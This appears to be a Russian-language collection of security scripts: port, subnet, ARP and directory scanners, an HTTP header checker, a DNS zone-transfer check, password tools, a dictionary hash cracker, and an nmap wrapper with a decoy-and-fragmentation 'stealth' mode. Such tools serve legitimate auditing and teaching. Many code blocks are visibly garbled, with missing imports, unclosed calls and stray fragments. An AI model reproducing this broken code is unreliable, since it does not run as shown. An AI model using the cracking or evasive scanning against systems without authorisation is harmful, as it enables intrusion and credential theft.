### 1.1 Сканер портов (Port Scanner)

```python
#!/usr/bin/env python3
"""
Многопоточный TCP сканер портов с захватом баннеров.

Описание:
    Выполняет TCP Connect сканирование указанного хоста.
    Поддерживает многопоточность для ускорения, захват баннеров служб.

Использование:
    python3 port_scanner.py -t 192.168.1.1 -p 1-1024 --threads 100
    python3 port_scanner.py -t example.com -p 22,80,443,8080
    python3 port_scanner.py -t 10.0.0.1 -p 1-65535 --timeout 0.5

Пример вывода:
    [*] Сканирование хоста: 192.168.1.1
    [*] Диапазон портов: 1-1024
    [+] Порт 22/tcp   ОТКРЫТ  | SSH-2.0-OpenSSH_8.9
    [+] Порт 80/tcp   ОТКРЫТ  | Apache/2.4.52
    [+] Порт 443/tcp  ОТКРЫТ  | 
    [*] Сканирование завершено за 12.34 секунд
    [*] Найдено открытых портов: 3
"""

import socket
import argparse
import threading
import time
import sys
from queue import Queue
from datetime import datetime

# Блокировка для потокобезопасного вывода
print_lock = threading.Lock()

# Список найденных открытых портов
open_ports = []


def захватить_баннер(sock, timeout=2):
    """Попытка получить баннер от сервиса."""
    try:
        sock.settimeout(timeout)
        # Отправляем пустую строку для HTTP-подобных сервисов
        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
        # Берём только первую строку баннера
        return banner.split("\n")[0][:80]
    except (socket.timeout, OSError, UnicodeDecodeError):
        return ""


def сканировать_порт(host, port, timeout):
    """Сканирование одного порта с попыткой захвата баннера."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))

        if result == 0:
            banner = захватить_баннер(sock)
            with print_lock:
                open_ports.append((port, banner))
                status = f"[+] Порт {port}/tcp   ОТКРЫТ"
                if banner:
                    status += f"  | {banner}"
                print(status)

        sock.close()
    except (socket.error, OSError):
        pass


def рабочий_поток(host, timeout, queue):
    """Рабочий поток для обработки портов из очереди."""
    while not queue.empty():
        port = queue.get()
        сканировать_порт(host, port, timeout)
        queue.task_done()


def разобрать_порты(port_str):
    """Разбор строки с портами: '22,80,443' или '1-1024'."""
    ports = set()
    for part in port_str.split(","):
        part = part.strip()
        if "-" in part:
            start, end = part.split("-", 1)
            for p in range(int(start), int(end) + 1):
                if 1 <= p <= 65535:
                    ports.add(p)
        else:
            p = int(part)
            if 1 <= p <= 65535:
                ports.add(p)
    return sorted(ports)


def main():
    parser = argparse.ArgumentParser(
        description="Многопоточный TCP сканер портов"
    )
    parser.add_argument(
        "-t", "--target", required=True,
        help="Целевой хост (IP или домен)"
    )
    parser.add_argument(
        "-p", "--ports", default="1-1024",
        help="Порты для сканирования (напр. 22,80,443 или 1-1024)"
    )
    parser.add_argument(
        "--threads", type=int, default=100,
        help="Количество потоков (по умолчанию: 100)"
    )
    parser.add_argument(
        "--timeout", type=float, default=1.0,
        help="Таймаут подключения в секундах (по умолчанию: 1.0)"
    )
    args = parser.parse_args()

    # Разрешаем имя хоста
    try:
        target_ip = socket.gethostbyname(args.target)
    except socket.gaierror:
        print(f"[!] Ошибка: не удаётся разрешить хост {args.target}")
        sys.exit(1)

    ports = разобрать_порты(args.ports)

    print(f"\n{'=' * 60}")
    print(f"  Сканер портов v1.0")
    print(f"{'=' * 60}")
    print(f"[*] Цель: {args.target} ({target_ip})")
    print(f"[*] Количество портов: {len(ports)}")
    print(f"[*] Потоки: {args.threads}")
    print(f"[*] Начало: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'=' * 60}\n")

    # Заполняем очередь портами
    port_queue = Queue()
    for port in ports:
        port_queue.put(port)

    start_time = time.time()

    # Запускаем потоки
    threads = []
    for _ in range(min(args.threads, len(ports))):
        t = threading.Thread(
            target=рабочий_поток,
            args=(target_ip, args.timeout, port_queue)
        )
        t.daemon = True
        t.start()
        threads.append(t)

    # Ожидаем завершения всех потоков
    port_queue.join()

    elapsed = time.time() - start_time

    print(f"\n{'=' * 60}")
    print(f"[*] Сканирование завершено за {elapsed:.2f} секунд")
    print(f"[*] Найдено открытых портов: {len(open_ports)}")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()
```

### 1.2 Сканер подсети (Subnet Scanner)

```python
#!/usr/bin/env python3
"""
Сканер подсети (Ping Sweep).

Описание:
    Обнаруживает активные хосты в указанной подсети с помощью ICMP ping.
    Использует многопоточность для быстрого сканирования.

Использование:
    python3 subnet_scanner.py -n 192.168.1.0/24
    python3 subnet_scanner.py -n 10.0.0.0/24 --threads 50 --timeout 1

Пример вывода:
    [*] Сканирование подсети: 192.168.1.0/24 (254 хоста)
    [+] 192.168.1.1     активен (0.5 мс)
    [+] 192.168.1.10    активен (1.2 мс)
    [+] 192.168.1.100   активен (0.8 мс)
    [*] Найдено активных хостов: 3 из 254
"""

import subprocess
import argparse
import threading
import ipaddress
import platform
import time
import sys
from queue import Queue

print_lock = threading.Lock()
active_hosts = []


def пинг_хоста(ip, timeout):
    """Пингуем один хост и возвращаем результат."""
    # Определяем параметры в зависимости от ОС
    param_count = "-n" if platform.system().lower() == "windows" else "-c"
    param_timeout = "-w" if platform.system().lower() == "windows" else "-W"

    try:
        start = time.time()
        result = subprocess.run(
            ["ping", param_count, "1", param_timeout, str(timeout), str(ip)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=timeout + 1
        )
        elapsed = (time.time() - start) * 1000  # миллисекунды

        if result.returncode == 0:
            with print_lock:
                active_hosts.append(str(ip))
                print(f"[+] {str(ip):<16} активен ({elapsed:.1f} мс)")
    except (subprocess.TimeoutExpired, OSError):
        pass


def рабочий_поток(timeout, queue):
    """Обрабатываем адреса из очереди."""
    while not queue.empty():
        ip = queue.get()
        пинг_хоста(ip, timeout)
        queue.task_done()


def main():
    parser = argparse.ArgumentParser(
        description="Сканер подсети (Ping Sweep)"
    )
    parser.add_argument(
        "-n", "--network", required=True,
        help="Подсеть в формате CIDR (напр. 192.168.1.0/24)"
    )
    parser.add_argument(
        "--threads", type=int, default=30,
        help="Количество потоков (по умолчанию: 30)"
    )
    parser.add_argument(
        "--timeout", type=int, default=2,
        help="Таймаут пинга в секундах (по умолчанию: 2)"
    )
    args = parser.parse_args()

    try:
        network = ipaddress.ip_network(args.network, strict=False)
    except ValueError as e:
        print(f"[!] Ошибка: неверный формат подсети: {e}")
        sys.exit(1)

    hosts = list(network.hosts())

    print(f"\n[*] Сканирование подсети: {args.network} ({len(hosts)} хостов)")
    print(f"[*] Потоки: {args.threads}\n")

    queue = Queue()
    for host in hosts:
        queue.put(host)

    start_time = time.time()

    threads = []
    for _ in range(min(args.threads, len(hosts))):
        t = threading.Thread(target=рабочий_поток, args=(args.timeout, queue))
        t.daemon = True
        t.start()
        threads.append(t)

    queue.join()

    elapsed = time.time() - start_time

    print(f"\n[*] Сканирование завершено за {elapsed:.1f} секунд")
    print(f"[*] Найдено активных хостов: {len(active_hosts)} из {len(hosts)}")

    if active_hosts:
        print("\n[*] Список активных хостов:")
        for host in sorted(active_hosts, key=lambda x: ipaddress.ip_address(x)):
            print(f"    {host}")


if __name__ == "__main__":
    main()
```

```python
#!/usr/bin/env python3
"""
Сканер безопасности HTTP-заголовков.

Описание:
    Проверяет наличие и правильность заголовков безопасности веб-сервера.
    Оценивает каждый заголовок: ХОРОШО / ПРЕДУПРЕЖДЕНИЕ / ПЛОХО.

Использование:
    python3 header_scanner.py -u https://example.com
    python3 header_scanner.py -u https://example.com --verbose

Пример вывода:
    [*] Проверка: https://example.com
    
    Заголовок                    Статус        Значение
    -----------------------------------------------------------
    X-Frame-Options              [ХОРОШО]      DENY
    X-Content-Type-Options       [ХОРОШО]      nosniff
    Strict-Transport-Security    [ПЛОХО]       Отсутствует
    Content-Security-Policy      [ПРЕДУПР.]    default-src *

"""

import requests

# Отключаем предупреждения о самоподписанных сертификатах
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        "описание": "Ограничение кросс-доменных политик (Flash/PDF)",
        "хорошо": lambda v: v.lower() == "none",
        "рекомендация": "none"
    },
}


def проверить_заголовки(url, verbose=False):
    """Проверяем заголовки безопасности для указанного URL."""
    try:
        response = requests.get(
            url, timeout=10, verify=False,
            allow_redirects=True,
            headers={"User-Agent": "SecurityHeaderScanner/1.0"}
        )
    except requests.RequestException as e:
        print(f"[!] Ошибка подключения: {e}")
        sys.exit(1)

    print(f"\n[*] Проверка: {url}")
    print(f"[*] Код ответа: {response.status_code}")
    print(f"[*] Сервер: {response.headers.get('Server', 'Не указан')}")
    print()

    # Ширина колонок
    col1 = 35
    col2 = 14
    print(f"{'Заголовок':<{col1}} {'Статус':<{col2}} Значение")
    print("-" * 75)

    score = 0
    max_score = len(ЗАГОЛОВКИ_БЕЗОПАСНОСТИ)

    for header_name, config in ЗАГОЛОВКИ_БЕЗОПАСНОСТИ.items():
        value = response.headers.get(header_name, None)

        if value is None:
            status = "\033[91m[ПЛОХО]\033[0m"
            display_value = "Отсутствует"
        else:
            try:
                if config["хорошо"](value):
                    status = "\033[92m[ХОРОШО]\033[0m"
                    score += 1
                    display_value = value[:40]
                else:
                    status = "\033[93m[ПРЕДУПР.]\033[0m"
                    score += 0.5
                    display_value = value[:40]
            except (ValueError, IndexError):
                status = "\033[93m[ПРЕДУПР.]\033[0m"
                score += 0.5
                display_value = value[:40]

        print(f"  {header_name:<{col1 - 2}} {status:<{col2 + 9}} {display_value}")

        if verbose and value is None:
            print(f"    Рекомендация: {config['рекомендация']}")
            print(f"    Описание: {config['описание']}")
            print()

    # Итоговая оценка
    grade = int(score / max_score * 10)
    print(f"\n{'=' * 75}")
    print(f"  Итоговая оценка: {grade}/10", end="")
    if grade >= 8:
        print(" - Отлично")
    elif grade >= 5:
        print(" - Удовлетворительно")
    else:
        print(" - Требуется улучшение")
    print(f"{'=' * 75}")

    # Проверяем дополнительные небезопасные заголовки
    опасные = ["Server", "X-Powered-By", "X-AspNet-Version"]
    раскрытие = []
    for h in опасные:
        if h in response.headers:
            раскрытие.append(f"  {h}: {response.headers[h]}")

    if раскрытие:
        print("\n[!] Заголовки, раскрывающие информацию о сервере:")
        for line in раскрытие:
            print(line)


def main():
    parser = argparse.ArgumentParser(
        description="Сканер безопасности HTTP-заголовков"
    )
    parser.add_argument(
        "-u", "--url", required=True,
        help="URL для проверки (напр. https://example.com)"
    )
    parser.add_argument(
        "--verbose", action="store_true",
        help="Показать рекомендации для отсутствующих заголовков"
    )
    args = parser.parse_args()

    if not args.url.startswith(("http://", "https://")):
        args.url = "https://" + args.url

    проверить_заголовки(args.url, args.verbose)


if __name__ == "__main__":
    main()
```

### 1.4 Генератор и проверка надёжности паролей

```python
#!/usr/bin/env python3
"""
Генератор безопасных паролей и оценка их надёжности.

Описание:
    Генерирует криптографически стойкие пароли заданной длины и сложности.
    Оценивает надёжность произвольного пароля по нескольким критериям.

Использование:
    python3 password_tool.py generate --length 20 --count 5
    python3 password_tool.py generate --length 16 --no-symbols
    python3 password_tool.py check --password "MyP@ssw0rd123"

Пример вывода:
    Сгенерированные пароли:
    1) kX9#mLp2$vNq7&Rw3!Zt  (надёжность: СИЛЬНЫЙ)
    2) Hf5@jYc8*bDg4^Wm6+Kx  (надёжность: СИЛЬНЫЙ)

    Проверка пароля: MyP@ssw0rd123
    Длина: 13 символов
    Надёжность: СРЕДНИЙ
    Оценка: 65/100
    Рекомендации:
    - Добавьте специальные символы
    - Увеличьте длину до 16+ символов
"""

import secrets
import string
import argparse
import math
import re
import sys


def оценить_пароль(password):
    """Оценка надёжности пароля (0-100 баллов)."""
    score = 0
    рекомендации = []

    # Длина
    length = len(password)
    if length >= 16:
        score += 30
    elif length >= 12:
        score += 20
    elif length >= 8:
        score += 10
    else:
        рекомендации.append("Увеличьте длину пароля минимум до 12 символов")

    # Наличие строчных букв
    if re.search(r"[a-z]", password):
        score += 10
    else:
        рекомендации.append("Добавьте строчные латинские буквы (a-z)")

    # Наличие заглавных букв
    if re.search(r"[A-Z]", password):
        score += 10
    else:
        рекомендации.append("Добавьте заглавные латинские буквы (A-Z)")

    # Наличие цифр
    if re.search(r"\d", password):
        score += 10
    else:
        рекомендации.append("Добавьте цифры (0-9)")

    # Наличие спецсимволов
    if re.search(r"[!@#$%^&*()_+\-=\[\]{};':\"\\|,.<>/?~`]", password):
        score += 15
    else:
        рекомендации.append("Добавьте специальные символы (!@#$%...)")

    # Энтропия
    charset = 0
    if re.search(r"[a-z]", password):
        charset += 26
    if re.search(r"[A-Z]", password):
        charset += 26
    if re.search(r"\d", password):
        charset += 10
    if re.search(r"[^a-zA-Z0-9]", password):
        charset += 32

    entropy = length * math.log2(charset) if charset > 0 else 0
    if entropy >= 80:
        score += 15
    elif entropy >= 60:
        score += 10
    elif entropy >= 40:
        score += 5

    # Проверка последовательностей
    if re.search(r"(.)\1{2,}", password):
        score -= 10
        рекомендации.append("Избегайте повторяющихся символов (aaa, 111)")

    # Проверка словарных слов (базовая)
    слабые_паттерны = [
        "password", "пароль", "qwerty", "123456", "admin",
        "letmein", "welcome", "monkey", "dragon", "master"
    ]
    lower_pw = password.lower()
    for pattern in слабые_паттерны:
        if pattern in lower_pw:
            score -= 20
            рекомендации.append(f"Пароль содержит распространённое слово: '{pattern}'")
            break

    score = max(0, min(100, score))

    # Определяем уровень надёжности
    if score >= 80:
        уровень = "СИЛЬНЫЙ"
    elif score >= 60:
        уровень = "СРЕДНИЙ"
    elif score >= 40:
        уровень = "СЛАБЫЙ"
    else:
        уровень = "ОЧЕНЬ СЛАБЫЙ"

    return {
        "score": score,
        "уровень": уровень,
        "энтропия": entropy,
        "рекомендации": рекомендации
    }


def сгенерировать_пароль(length=16, use_upper=True, use_digits=True, use_symbols=True):
    """Генерация криптографически стойкого пароля."""
    charset = string.ascii_lowercase
    обязательные = [secrets.choice(string.ascii_lowercase)]

    if use_upper:
        charset += string.ascii_uppercase
        обязательные.append(secrets.choice(string.ascii_uppercase))
    if use_digits:
        charset += string.digits
        обязательные.append(secrets.choice(string.digits))
    if use_symbols:
        symbols = "!@#$%^&*()_+-=[]{}|;:,.<>?"
        charset += symbols
        обязательные.append(secrets.choice(symbols))

    # Генерируем оставшиеся символы
    remaining = length - len(обязательные)
    if remaining < 0:
        remaining = 0
        обязательные = обязательные[:length]

    password_chars = обязательные + [
        secrets.choice(charset) for _ in range(remaining)
    ]

    # Перемешиваем (cryptographically secure shuffle)
    password_list = list(password_chars)
    for i in range(len(password_list) - 1, 0, -1):
        j = secrets.randbelow(i + 1)
        password_list[i], password_list[j] = password_list[j], password_list[i]

    return "".join(password_list)

    parser = argparse.ArgumentParser(

    subparsers = parser.add_subparsers(dest="command", help="Команда")
```

```python
                        print(f"[!] РЕКОМЕНДАЦИЯ: Немедленно смените этот пароль!")
                        return count

            print("\n[+] Пароль НЕ найден в известных утечках.")
            print("[*] Это не гарантирует его безопасность.")
            return 0

        else:
            print(f"[!] Ошибка API: HTTP {response.status_code}")
            return None

    except requests.RequestException as e:
        print(f"[!] Ошибка подключения: {e}")
        return None
```

```python
def определить_производителя(mac):
    """Определяем производителя по первым 3 байтам MAC-адреса (OUI)."""
    oui = mac[:8].lower()
    return ИЗВЕСТНЫЕ_OUI.get(oui, "Неизвестно")


def arp_сканирование(target_ip, timeout=2):
    """Выполняем ARP-сканирование указанной подсети."""
    # Отключаем вывод Scapy
    conf.verb = 0

    # Создаём ARP-пакет
    # Ether(dst="ff:ff:ff:ff:ff:ff") - широковещательный кадр
    # ARP(pdst=target_ip) - ARP-запрос для диапазона IP
    arp_request = ARP(pdst=target_ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request

    print(f"[*] Отправка ARP-запросов в {target_ip}...")

    # Отправляем пакеты и получаем ответы
    answered, unanswered = srp(packet, timeout=timeout, verbose=False)

    # Собираем результаты
    devices = []
    for sent, received in answered:
        devices.append({
            "ip": received.psrc,
            "mac": received.hwsrc,
            "vendor": определить_производителя(received.hwsrc)
        })

    return devices


def main():

    parser.add_argument(

        help="Целевая подсеть (напр. 192.168.1.0/24)"

        print("[*] Запустите: sudo python3 arp_scanner.py ...")
        sys.exit(1)

    print(f"\n[*] ARP сканирование: {args.network}\n")

    devices = arp_сканирование(args.network, args.timeout)

    if devices:
        col1, col2, col3 = 18, 20, 25
        print(f"{'IP-адрес':<{col1}} {'MAC-адрес':<{col2}} {'Производитель':<{col3}}")
        print("-" * (col1 + col2 + col3))

        for device in sorted(devices, key=lambda d: [
            int(x) for x in d["ip"].split(".")
        ]):
            print(f"{device['ip']:<{col1}} {device['mac']:<{col2}} {device['vendor']}")

    print(f"\n[*] Найдено устройств: {len(devices)}")


if __name__ == "__main__":
    main()
```

```python
def проверить_зонную_передачу(domain):

        ns_answers = dns.resolver.resolve(domain, "NS")

        try:
            ns_ip = socket.gethostbyname(ns_str)

            print(f"[!!!] Зонная передача УСПЕШНА с {ns_str}!")
            print(f"[!!!] Это серьёзная уязвимость конфигурации!\n")

            for name, node in sorted(zone.nodes.items()):
                rdatasets = node.rdatasets

            return True

            print(f"    [-] Зонная передача запрещена (нормально).")
        except (socket.gaierror, dns.exception.DNSException, OSError) as e:

    return False

                tt.join(timeout=5)

    for t in thread_list:
        t.join(timeout=5)
```

```python
Пример вывода:

def сканировать_путь(base_url, path, extensions, session, valid_status):
    """Проверяем один путь на сервере."""
    paths_to_check = [path]

    # Добавляем расширения
    if extensions and "." not in path:
        for ext in extensions:
            paths_to_check.append(f"{path}.{ext}")

    for p in paths_to_check:
        url = f"{base_url.rstrip('/')}/{p}"
        try:
            response = session.get(
                url, timeout=10, verify=False,
                allow_redirects=False
            )

            if response.status_code in valid_status:
                size = len(response.content)
                redirect = ""
                if response.status_code in (301, 302):
                    location = response.headers.get("Location", "")
                    redirect = f" (-> {location})"

                with print_lock:
                    result = {
                        "url": url,
                        "status": response.status_code,
                        "size": size
                    }
                    found_paths.append(result)
                    print(f"[{response.status_code}] {url:<50} "
                          f"(размер: {size}){redirect}")

            pass

if __name__ == "__main__":
```

```python
#!/usr/bin/env python3
"""
Взломщик хэшей по словарю (Hash Cracker).

Описание:
    Выполняет словарную атаку на хэши паролей.
    Поддерживает MD5, SHA1, SHA256, SHA512.
    Автоматически определяет тип хэша по длине.

Использование:
    python3 hash_cracker.py -H 5f4dcc3b5aa765d61d8327deb882cf99 -w rockyou.txt
    python3 hash_cracker.py -H хэш --type sha256 -w passwords.txt
    python3 hash_cracker.py --file hashes.txt -w wordlist.txt

Пример вывода:
    [*] Тип хэша: MD5 (определён автоматически)
    [*] Словарь: rockyou.txt (14344392 слов)
    [*] Начало атаки...
    
    [+] НАЙДЕНО! 5f4dcc3b5aa765d61d8327deb882cf99 : password
    
    [*] Время: 2.34 секунды
    [*] Проверено: 156842 хэшей
    [*] Скорость: 67024 хэшей/сек
"""

import hashlib
import argparse
import time
import sys


# Соответствие длины хэша и алгоритма
ТИПЫ_ХЭШЕЙ = {
    32: "md5",
    40: "sha1",
    64: "sha256",
    128: "sha512"
}


def определить_тип_хэша(hash_string):
    """Автоматическое определение типа хэша по длине."""
    length = len(hash_string.strip())
    if length in ТИПЫ_ХЭШЕЙ:
        return ТИПЫ_ХЭШЕЙ[length]
    return None


def вычислить_хэш(text, hash_type):
    """Вычисляем хэш строки указанным алгоритмом."""
    encoded = text.encode("utf-8")
    if hash_type == "md5":
        return hashlib.md5(encoded).hexdigest()
    elif hash_type == "sha1":
        return hashlib.sha1(encoded).hexdigest()
    elif hash_type == "sha256":
        return hashlib.sha256(encoded).hexdigest()
    elif hash_type == "sha512":
        return hashlib.sha512(encoded).hexdigest()
    else:
        raise ValueError(f"Неподдерживаемый алгоритм: {hash_type}")


def взломать_хэш(target_hash, hash_type, wordlist_path):
    """Словарная атака на один хэш."""
    target_hash = target_hash.strip().lower()

    # Автоматическое определение типа
    if not hash_type:
        hash_type = определить_тип_хэша(target_hash)
        if hash_type:
            print(f"[*] Тип хэша: {hash_type.upper()} (определён автоматически)")
        else:
            print(f"[!] Не удалось определить тип хэша (длина: {len(target_hash)})")
            return None

    print(f"[*] Цель: {target_hash}")
    print(f"[*] Алгоритм: {hash_type.upper()}")

    # Подсчитываем строки в словаре
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            total_words = sum(1 for _ in f)
        print(f"[*] Словарь: {wordlist_path} ({total_words:,} слов)")
    except FileNotFoundError:
        print(f"[!] Файл не найден: {wordlist_path}")
        return None

    print("[*] Начало атаки...\n")
    start_time = time.time()
    checked = 0

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                word = line.strip()
                if not word:
                    continue

                computed_hash = вычислить_хэш(word, hash_type)
                checked += 1

                if computed_hash == target_hash:
                    elapsed = time.time() - start_time
                    speed = checked / elapsed if elapsed > 0 else 0
                    print(f"[+] НАЙДЕНО! {target_hash} : {word}")
                    print(f"\n[*] Время: {elapsed:.2f} секунд")
                    print(f"[*] Проверено: {checked:,} хэшей")
                    print(f"[*] Скорость: {speed:,.0f} хэшей/сек")
                    return word

                # Прогресс каждые 500000 слов
                if checked % 500000 == 0:
                    elapsed = time.time() - start_time
                    speed = checked / elapsed if elapsed > 0 else 0
                    progress = (checked / total_words) * 100
                    print(f"  [{progress:.1f}%] Проверено {checked:,} слов "
                          f"({speed:,.0f} хэш/сек)")

    except KeyboardInterrupt:
        print(f"\n[!] Прервано пользователем после {checked:,} проверок")
        return None

    elapsed = time.time() - start_time
    speed = checked / elapsed if elapsed > 0 else 0
    print(f"\n[-] Пароль НЕ найден в словаре.")
    print(f"[*] Проверено: {checked:,} хэшей за {elapsed:.2f} сек "
          f"({speed:,.0f} хэш/сек)")
    return None


def взломать_файл_хэшей(hash_file, hash_type, wordlist_path):
    """Словарная атака на файл с хэшами."""
    try:
        with open(hash_file, "r") as f:
            hashes = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Файл не найден: {hash_file}")
        return

    print(f"[*] Загружено хэшей: {len(hashes)}")

    # Предварительно загружаем словарь в память для ускорения
    print(f"[*] Загрузка словаря в память...")
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            words = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Файл не найден: {wordlist_path}")
        return

    print(f"[*] Словарь загружен: {len(words):,} слов")

    if not hash_type:
        hash_type = определить_тип_хэша(hashes[0])
        print(f"[*] Тип хэша: {hash_type.upper()}")

    # Создаём радужную таблицу (предвычисленные хэши)
    print("[*] Вычисление хэшей...")
    rainbow = {}
    for word in words:
        h = вычислить_хэш(word, hash_type)
        rainbow[h] = word

    print("[*] Поиск совпадений...\n")
    found = 0
    for h in hashes:
        h = h.lower().strip()
        if h in rainbow:
            print(f"[+] {h} : {rainbow[h]}")
            found += 1
        else:
            print(f"[-] {h} : не найден")

    print(f"\n[*] Найдено: {found} из {len(hashes)}")


def main():
    parser = argparse.ArgumentParser(

    parser.add_argument(
        "-w", "--wordlist", required=True,
        help="Файл словаря"
    )
    parser.add_argument(
        "--type", choices=["md5", "sha1", "sha256", "sha512"],

    args = parser.parse_args()

    print(f"\n{'=' * 60}")
    print(f"  Взломщик хэшей v1.0")
    print(f"{'=' * 60}\n")

    if args.hash:
        взломать_хэш(args.hash, args.type, args.wordlist)

        взломать_файл_хэшей(args.file, args.type, args.wordlist)


if __name__ == "__main__":
    main()
```

```bash
# Функция вывода справки
показать_справку() {
    echo "Использование: $0 -t ЦЕЛЬ -m РЕЖИМ [-o КАТАЛОГ]"
    echo ""
    echo "Параметры:"
    echo "  -t  Цель (IP-адрес, подсеть или домен)"
    echo "  -m  Режим сканирования: quick|full|vuln|stealth|udp"
    echo "  -o  Каталог для отчётов (по умолчанию: ./nmap_reports)"
    echo "  -h  Показать эту справку"
    exit 0
}

# Функция логирования
лог() {
    local уровень=$1
    local сообщение=$2
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')

    case $уровень in
        "info")  echo -e "${BLUE}[*]${NC} [$timestamp] $сообщение" ;;
        "ok")    echo -e "${GREEN}[+]${NC} [$timestamp] $сообщение" ;;
        "warn")  echo -e "${YELLOW}[!]${NC} [$timestamp] $сообщение" ;;
        "error") echo -e "${RED}[!]${NC} [$timestamp] $сообщение" ;;
    esac
}

# Проверяем наличие Nmap
проверить_зависимости() {
    if ! command -v nmap &> /dev/null; then
        лог "error" "Nmap не установлен. Установите: sudo apt install nmap"
        exit 1
    fi

    # Проверяем права root (нужны для SYN сканирования)
    if [[ $EUID -ne 0 ]] && [[ "$MODE" == "stealth" || "$MODE" == "full" || "$MODE" == "udp" ]]; then
        лог "warn" "Режим '$MODE' требует прав root для SYN/UDP сканирования."
        лог "warn" "Запустите с sudo или результаты могут быть неполными."
    fi
}

# Разбор аргументов
while getopts "t:m:o:h" opt; do
    case $opt in
        t) TARGET="$OPTARG" ;;
        m) MODE="$OPTARG" ;;
        o) OUTPUT_DIR="$OPTARG" ;;
        h) показать_справку ;;
        *) показать_справку ;;
    esac
done

# Проверка обязательных параметров
if [[ -z "$TARGET" ]]; then
    лог "error" "Цель не указана. Используйте -t ЦЕЛЬ"
    показать_справку
fi

проверить_зависимости

# Создаём каталог для отчётов
SCAN_DATE=$(date '+%Y-%m-%d_%H-%M-%S')
SAFE_TARGET=$(echo "$TARGET" | tr '/' '_')
REPORT_DIR="${OUTPUT_DIR}/${SAFE_TARGET}/${SCAN_DATE}"
mkdir -p "$REPORT_DIR"

лог "info" "Режим: $MODE"
лог "info" "Цель: $TARGET"
лог "info" "Каталог отчётов: $REPORT_DIR"
echo ""

# Функции сканирования
быстрое_сканирование() {
    лог "ok" "Быстрое сканирование (топ 1000 портов)..."
    nmap -sV -T4 --top-ports 1000 \
        -oN "${REPORT_DIR}/quick_scan.txt" \
        -oX "${REPORT_DIR}/quick_scan.xml" \
        "$TARGET"
}

полное_сканирование() {
    лог "ok" "Этап 1/3: Обнаружение хостов..."
    nmap -sn -oN "${REPORT_DIR}/host_discovery.txt" "$TARGET"

    лог "ok" "Этап 2/3: Полное сканирование всех портов..."
    nmap -sS -p- -T4 --min-rate 1000 \
        -oN "${REPORT_DIR}/all_ports.txt" \
        -oX "${REPORT_DIR}/all_ports.xml" \
        "$TARGET"

    # Извлекаем открытые порты для детального сканирования
    OPEN_PORTS=$(grep "^[0-9]" "${REPORT_DIR}/all_ports.txt" 2>/dev/null \
        | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')

    if [[ -n "$OPEN_PORTS" ]]; then
        лог "ok" "Этап 3/3: Детальное сканирование портов: $OPEN_PORTS"
        nmap -sV -sC -A -p "$OPEN_PORTS" \
            -oN "${REPORT_DIR}/detailed_scan.txt" \
            -oX "${REPORT_DIR}/detailed_scan.xml" \
            "$TARGET"
    else
        лог "warn" "Открытые порты не найдены"
    fi
}

сканирование_уязвимостей() {
    лог "ok" "Этап 1/2: Определение открытых портов..."
    nmap -sV -T4 --top-ports 1000 \
        -oN "${REPORT_DIR}/service_scan.txt" \
        "$TARGET"

    лог "ok" "Этап 2/2: Сканирование на уязвимости..."
    nmap --script vuln -sV \
        -oN "${REPORT_DIR}/vuln_scan.txt" \
        -oX "${REPORT_DIR}/vuln_scan.xml" \
        "$TARGET"
}

скрытное_сканирование() {
    лог "ok" "Скрытное SYN сканирование..."
    nmap -sS -T2 -f --data-length 24 -D RND:5 \
        --top-ports 1000 \
        -oN "${REPORT_DIR}/stealth_scan.txt" \
        -oX "${REPORT_DIR}/stealth_scan.xml" \
        "$TARGET"
}

udp_сканирование() {
    лог "ok" "UDP сканирование (топ 100 портов)..."
    nmap -sU --top-ports 100 -T4 \
        -oN "${REPORT_DIR}/udp_scan.txt" \
        -oX "${REPORT_DIR}/udp_scan.xml" \
        "$TARGET"
}

# Выполняем сканирование в зависимости от режима
case $MODE in
    "quick")   быстрое_сканирование ;;
    "full")    полное_сканирование ;;
    "vuln")    сканирование_уязвимостей ;;
    "stealth") скрытное_сканирование ;;
    "udp")     udp_сканирование ;;
    *)
        лог "error" "Неизвестный режим: $MODE"
        показать_справку
        ;;
esac

echo ""
лог "ok" "Сканирование завершено!"
лог "info" "Отчёты сохранены в: $REPORT_DIR"
ls -la "$REPORT_DIR"
```

### 2.2 Проверка надёжности пароля

```bash
#!/bin/bash
# ==============================================================================
# Проверка надёжности пароля
#
# Описание:
#   Оценивает надёжность пароля по нескольким критериям:
#   длина, сложность, наличие в словаре распространённых паролей.
#
# Использование:
#   ./password_check.sh
#   echo "MyPassword123" | ./password_check.sh
#
# Пример вывода:
#   Введите пароль для проверки:
#   
#   Результаты проверки:
#   [+] Длина: 13 символов (хорошо)
#   [+] Содержит заглавные буквы
#   [+] Содержит строчные буквы
#   [+] Содержит цифры
#   [-] Не содержит спецсимволов
#   [-] Содержит словарное слово: password
#   
#   Оценка: 55/100 (СРЕДНИЙ)
# ==============================================================================

set -uo pipefail

# Цвета
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m'

# Распространённые пароли для проверки
СЛАБЫЕ_ПАРОЛИ=(
    "password" "123456" "12345678" "qwerty" "abc123"
    "monkey" "master" "dragon" "111111" "baseball"
    "iloveyou" "trustno1" "sunshine" "princess" "admin"
    "welcome" "shadow" "superman" "michael" "football"
    "пароль" "йцукен" "любовь" "привет" "наташа"
)

# Чтение пароля
if [ -t 0 ]; then
    echo -n "Введите пароль для проверки: "
    read -rs PASSWORD
    echo ""
else
    read -r PASSWORD
fi

if [[ -z "$PASSWORD" ]]; then
    echo -e "${RED}[!] Пароль не может быть пустым${NC}"
    exit 1
fi

SCORE=0
ДЛИНА=${#PASSWORD}

echo ""
echo "========================================="
